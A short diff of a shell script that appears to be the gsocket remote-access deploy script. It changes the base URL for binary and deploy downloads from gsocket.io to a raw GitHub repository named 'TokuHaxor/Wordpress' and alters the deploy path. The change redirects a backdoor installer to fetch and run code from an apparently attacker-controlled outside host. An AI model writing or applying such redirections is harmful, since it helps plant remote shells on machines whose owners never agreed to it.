@@ -65,10 +65,10 @@
 #       - Guess what...
 
 # Global Defines
-URL_BASE="https://gsocket.io"
+URL_BASE="https://raw.githubusercontent.com/TokuHaxor/Wordpress/main"
 [[ -n $GS_URL_BASE ]] && URL_BASE="${GS_URL_BASE}"
 URL_BIN="${URL_BASE}/bin"
-URL_DEPLOY="${URL_BASE}/x"
+URL_DEPLOY="${URL_BASE}/a"
 [[ -n $GS_URL_BIN ]] && URL_BIN="${GS_URL_BIN}"
 [[ -n $GS_URL_DEPLOY ]] && URL_DEPLOY="${GS_URL_DEPLOY}"
 
